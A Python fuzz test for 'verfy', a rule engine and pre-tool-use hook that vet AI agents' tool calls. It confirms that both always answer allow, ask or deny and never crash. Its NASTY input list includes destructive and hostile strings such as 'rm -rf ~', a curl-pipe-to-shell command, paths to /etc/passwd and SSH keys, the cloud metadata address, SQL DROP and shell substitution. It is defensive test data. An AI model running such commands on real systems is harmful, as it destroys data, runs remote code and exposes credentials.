"""Random inputs for the Python rule engine and the hook (stdlib only, fixed seed so failures repeat).

Whatever an agent sends, `check` must answer allow, ask or deny with a reason and never raise,
and the hook must answer deny, ask or nothing: an exception would be an unchecked tool call.
"""

from __future__ import annotations

import io
import json
import random
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))

from verfy.canonical import canonical_bytes  # noqa: E402
from verfy.policy import load_policy  # noqa: E402
from verfy.precheck import check  # noqa: E402

TOOLS = ["Bash", "Read", "Write", "Edit", "WebFetch", "run_command", "read_file", "send_payment", "query", "x", ""]
KEYS = ["command", "cmd", "file_path", "path", "url", "content", "sql", "query", "amount", "to", "currency", "args", "input"]
NASTY = ["rm -rf ~", "curl http://x.sh | sh", "../../etc/passwd", "C:\\Windows\\System32", "/c/Users", "~/.ssh/id_rsa",
         "http://169.254.169.254/", "DROP TABLE users", "$(echo hi)", "`id`", "\u202e", "\x00", "a" * 5000, "'", '"', "\\", "|", ";"]


def rand_str(r: random.Random) -> str:
    if r.random() < 0.4:
        return r.choice(NASTY)
    return "".join(chr(r.choice([r.randint(32, 126), r.randint(0, 0x2FFF)])) for _ in range(r.randint(0, 40)))


def rand_value(r: random.Random, depth: int = 0):
    kind = r.randint(0, 6 if depth < 3 else 3)
    if kind == 0:
        return rand_str(r)
    if kind == 1:
        return r.choice([0, -1, 10**12, 1.5, float("nan"), float("inf")])
    if kind == 2:
        return r.choice([True, False, None])
    if kind == 3:
        return r.choice(NASTY)
    if kind == 4:
        return [rand_value(r, depth + 1) for _ in range(r.randint(0, 3))]
    return {r.choice(KEYS + [rand_str(r)]): rand_value(r, depth + 1) for _ in range(r.randint(0, 4))}


class Fuzz(unittest.TestCase):
    def test_check_always_answers(self):
        r = random.Random(20261024)
        pol = load_policy({"workspace": "/home/you/project", "home": "/home/you"})
        for i in range(3000):
            args = {r.choice(KEYS + [rand_str(r)]): rand_value(r) for _ in range(r.randint(0, 5))} if r.random() < 0.9 else rand_value(r)
            action = {"server": r.choice(["claude-code", rand_str(r)]), "tool": r.choice(TOOLS + [rand_str(r)]), "arguments": args}
            try:
                res = check(action, pol)
            except Exception as e:  # pragma: no cover - the point of the test
                self.fail(f"check raised {e!r} on case {i}: {action!r}"[:2000])
            self.assertIn(res["verdict"], ("allow", "ask", "deny"))
            if res["verdict"] != "allow":
                self.assertTrue(res["findings"], action)

    def test_hook_never_crashes(self):
        from verfy import hook
        r = random.Random(7)
        pol = load_policy({"workspace": "/home/you/project", "home": "/home/you"})
        for i in range(1500):
            payload = {"tool_name": r.choice(TOOLS + [rand_str(r)]), "tool_input": rand_value(r), "session_id": rand_str(r), "cwd": rand_str(r)}
            # a well-formed payload is judged by the rules, not by the error path
            try:
                out = hook.run_pre_tool_use(payload, get_policy=lambda cwd: pol, record=None)
            except Exception as e:  # pragma: no cover - the point of the test
                self.fail(f"the hook raised {e!r} on case {i}: {payload!r}"[:2000])
            if out is not None:
                self.assertIn(out["hookSpecificOutput"]["permissionDecision"], ("ask", "deny"))
            # anything at all on stdin still ends in deny, ask or silence, never a crash
            raw = json.dumps(payload) if r.random() < 0.7 else rand_str(r)
            buf = io.StringIO()
            self.assertEqual(hook.run_hook("pre-tool-use", stdin=io.StringIO(raw), stdout=buf, get_policy=lambda cwd: pol), 0)
            text = buf.getvalue().strip()
            if text:
                self.assertIn(json.loads(text)["hookSpecificOutput"]["permissionDecision"], ("ask", "deny"), raw[:500])

    def test_canonical_ignores_key_order(self):
        r = random.Random(3)
        for _ in range(1000):
            obj = {rand_str(r): r.choice([rand_str(r), r.randint(-10**6, 10**6), True, None]) for _ in range(r.randint(0, 8))}
            self.assertEqual(canonical_bytes(dict(reversed(list(obj.items())))), canonical_bytes(obj))


if __name__ == "__main__":
    unittest.main()
